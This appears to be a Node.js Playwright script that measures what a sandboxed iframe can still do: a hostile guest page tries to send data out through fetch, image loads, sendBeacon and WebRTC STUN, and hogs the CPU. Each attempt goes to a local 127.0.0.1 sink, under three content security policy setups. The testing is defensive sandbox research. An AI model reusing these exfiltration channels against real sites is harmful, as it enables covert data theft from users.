#!/usr/bin/env node
// What a sandboxed app frame can still do: send data out, and use the CPU.
//
//   node inklet/finkapp/test/sandbox-limits.mjs [chromium|firefox|webkit]
//
// A measurement, not a pass/fail suite. It loads a hostile guest page in an
// <iframe sandbox="allow-scripts"> (an opaque origin, as the shell gives every
// app) three ways: plain, with a content security policy in the guest's own
// page, and with the iframe `csp` attribute. It prints which routes reached a
// local sink (fetch, image, beacon, WebRTC STUN over UDP) and the longest gap
// in the host page's own timer while the guest spins. The fink skill,
// "Limits of the sandbox partition", records the results and what is still
// unmeasured.

import http from 'node:http';
import dgram from 'node:dgram';
import * as pw from '@playwright/test';

const which = process.argv[2] || 'chromium';
const PORT = 8211;                       // pages
const SINK = 8212;                       // http sink
const STUN = 8213;                       // udp sink
const EXE = process.env.PW_CHROME || '/opt/pw-browsers/chromium-1194/chrome-linux/chrome';

const hits = [];
const sink = http.createServer((req, res) => { hits.push(`http ${req.url}`); res.writeHead(204); res.end(); });
sink.listen(SINK, '127.0.0.1');
const udp = dgram.createSocket('udp4');
udp.on('message', (m) => hits.push(`udp ${m.length} bytes`));
udp.bind(STUN, '127.0.0.1');

const GUEST = (head = '') => `<!doctype html><meta charset="utf-8">${head}<title>guest</title>
<script>
addEventListener('message', async (e) => {
  const t = e.data.tag;
  if (e.data.cmd === 'leak') {
    try { fetch('http://127.0.0.1:${SINK}/fetch?' + t, { mode: 'no-cors' }).catch(() => {}); } catch (x) {}
    try { new Image().src = 'http://127.0.0.1:${SINK}/img?' + t; } catch (x) {}
    try { navigator.sendBeacon('http://127.0.0.1:${SINK}/beacon?' + t, 'x'); } catch (x) {}
    try {
      const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${STUN}' }] });
      pc.createDataChannel(t);
      await pc.setLocalDescription(await pc.createOffer());
    } catch (x) { /* no WebRTC here */ }
  }
  if (e.data.cmd === 'spin') {
    const end = performance.now() + e.data.ms;
    while (performance.now() < end) { /* busy */ }
  }
});
parent.postMessage({ ready: true, origin: String(self.origin) }, '*');
</script>`;
const CSP = `default-src 'none'; script-src 'unsafe-inline'`;
const HOST = (src, attrs) => `<!doctype html><meta charset="utf-8"><body>
<iframe id="g" sandbox="allow-scripts" ${attrs} src="${src}"></iframe>
<script>
window.msgs = []; addEventListener('message', (e) => msgs.push(e.data));
window.beats = []; setInterval(() => beats.push(performance.now()), 20);
</script>`;

const CASES = [
  ['no policy', 'guest.html', ''],
  ['policy in the guest page (meta)', 'guest-meta.html', ''],
  ['iframe csp attribute', 'guest.html', `csp="${CSP}"`],
];
const wait = (ms) => new Promise((r) => setTimeout(r, ms));

// A real server, not page.route: a fulfilled response has no address, and
// Chromium's local-network rules then block its requests to 127.0.0.1.
const pages = http.createServer((req, res) => {
  const u = new URL(req.url, `http://127.0.0.1:${PORT}`);
  const body = u.pathname === '/guest.html' ? GUEST()
    : u.pathname === '/guest-meta.html' ? GUEST(`<meta http-equiv="Content-Security-Policy" content="${CSP}">`)
    : HOST(u.searchParams.get('src'), u.searchParams.get('attrs') || '');
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.end(body);
});
pages.listen(PORT, '127.0.0.1');

const launcher = pw[which];
const browser = await launcher.launch(which === 'chromium'
  ? { headless: true, executablePath: EXE, args: ['--no-sandbox'] } : { headless: true });
try {
  console.log(`${which} ${browser.version()}`);
  const page = await browser.newPage();
  for (const [name, src, attrs] of CASES) {
    const q = new URLSearchParams({ src: `http://127.0.0.1:${PORT}/${src}`, attrs });
    await page.goto(`http://127.0.0.1:${PORT}/host.html?${q}`);
    await page.waitForFunction(() => msgs.some((m) => m.ready), null, { timeout: 5000 }).catch(() => {});
    const ready = await page.evaluate(() => msgs.find((m) => m.ready) || null);
    const from = hits.length;
    await page.evaluate((t) => document.getElementById('g').contentWindow.postMessage({ cmd: 'leak', tag: t }, '*'),
      name.replace(/\W+/g, '-'));
    await wait(1500);
    const got = hits.slice(from).map((h) => h.replace(/\?.*$/, ''));
    await page.evaluate(() => { beats.length = 0; document.getElementById('g').contentWindow.postMessage({ cmd: 'spin', ms: 1500 }, '*'); });
    await wait(2200);
    const gap = await page.evaluate(() => {
      let g = 0; for (let i = 1; i < beats.length; i++) g = Math.max(g, beats[i] - beats[i - 1]); return Math.round(g);
    });
    console.log(`\n${name}`);
    console.log(`  frame ran: ${ready ? `yes (origin ${ready.origin})` : 'NO: it did not load'}`);
    console.log(`  reached the sink: ${got.length ? [...new Set(got)].join(', ') : 'nothing'}`);
    console.log(`  longest gap in the host's own timer while the guest spun 1500 ms: ${gap} ms`
      + (ready ? '' : ' (no guest ran)'));
  }
} finally {
  await browser.close();
  pages.close();
  sink.close();
  udp.close();
}
